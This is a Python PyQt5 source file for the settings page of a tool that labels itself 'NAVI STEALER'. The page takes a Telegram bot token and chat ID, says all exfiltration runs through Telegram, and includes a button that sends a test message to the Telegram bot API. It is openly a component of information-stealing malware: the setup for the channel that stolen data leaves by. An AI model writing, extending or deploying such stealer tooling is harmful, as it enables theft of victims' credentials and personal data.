import re

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
    QCheckBox, QGroupBox, QScrollArea, QLineEdit, QPushButton
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont

from ..styles import SCROLL_STYLE
from .message_box import CustomMessageBox

class OptionsPage(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(30, 30, 30, 30)
        main_layout.setSpacing(20)
        
        telegram_group = QGroupBox("telegram")
        telegram_group.setStyleSheet("""
            QGroupBox {
                font-size: 13px;
                font-weight: bold;
                color: #00a2ff;
                border: 1px solid #2a2a3a;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        telegram_layout = QVBoxLayout()
        telegram_layout.setContentsMargins(15, 20, 15, 15)
        telegram_layout.setSpacing(10)
        
        self.bot_token_input = QLineEdit()
        self.bot_token_input.setPlaceholderText("bot token")
        self.bot_token_input.setMinimumHeight(35)
        
        self.chat_id_input = QLineEdit()
        self.chat_id_input.setPlaceholderText("chat id")
        self.chat_id_input.setMinimumHeight(35)
        
        test_telegram_btn = QPushButton("check")
        test_telegram_btn.setObjectName("testButton")
        test_telegram_btn.setFixedSize(80, 35)
        test_telegram_btn.clicked.connect(self.check_telegram)
        
        telegram_layout.addWidget(self.bot_token_input)
        telegram_layout.addWidget(self.chat_id_input)
        telegram_layout.addWidget(test_telegram_btn, alignment=Qt.AlignRight)
        telegram_group.setLayout(telegram_layout)
        
        info_group = QGroupBox("information")
        info_group.setStyleSheet("""
            QGroupBox {
                font-size: 13px;
                font-weight: bold;
                color: #00a2ff;
                border: 1px solid #2a2a3a;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        info_layout = QVBoxLayout()
        info_layout.setContentsMargins(15, 25, 15, 15)
        info_layout.setSpacing(15)
        
        info_text = QLabel("NAVI STEALER\n\nAll exfiltration is handled via Telegram.\nMake sure to provide a valid Bot Token and Chat ID.")
        info_text.setStyleSheet("color: #aaa; font-size: 13px;")
        info_text.setAlignment(Qt.AlignCenter)
        
        github_link = QLabel('<a href="https://github.com/glockinhand/navi-multitool" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">GITHUB.COM/GLOCKINHAND/NAVI-MULTITOOL</a>')
        github_link.setOpenExternalLinks(True)
        github_link.setAlignment(Qt.AlignCenter)
        
        info_layout.addWidget(info_text)
        info_layout.addWidget(github_link)
        info_group.setLayout(info_layout)
        
        main_layout.addWidget(telegram_group)
        main_layout.addWidget(info_group)
        main_layout.addStretch()
        
        self.setLayout(main_layout)

    def get_telegram_config(self):
        token = self.bot_token_input.text().strip()
        chat_id = self.chat_id_input.text().strip()
        if token and chat_id:
            return {"token": token, "chat_id": chat_id}
        return None
    
    def check_telegram(self):
        token = self.bot_token_input.text().strip()
        chat_id = self.chat_id_input.text().strip()
        
        if not token or not chat_id:
            self.box = CustomMessageBox("NAVI", "error", "NAVI: enter token & id")
            self.box.show()
            return
        
        try:
            import requests
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {"chat_id": chat_id, "text": "NAVI: connection check success"}
            r = requests.post(url, json=data, timeout=10)
            
            if r.status_code == 200 and r.json().get("ok"):
                self.box = CustomMessageBox("NAVI", "success", "NAVI: check sent!")
            else:
                self.box = CustomMessageBox("NAVI", "error", "NAVI: invalid token/id")
            self.box.show()
        except Exception as e:
            self.box = CustomMessageBox("NAVI", "error", f"NAVI: error")
            self.box.show()
